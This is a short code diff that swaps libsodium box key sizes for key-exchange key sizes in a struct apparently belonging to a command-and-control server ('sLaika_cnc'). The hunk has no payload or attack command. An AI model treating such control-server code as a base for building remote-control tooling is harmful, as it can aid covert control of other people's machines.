@@ -8,7 +8,7 @@
 #include "lpeer.h"
 
 struct sLaika_cnc {
-    uint8_t priv[crypto_box_SECRETKEYBYTES], pub[crypto_box_PUBLICKEYBYTES];
+    uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
     struct sLaika_socket sock;
     struct sLaika_pollList pList;
 };
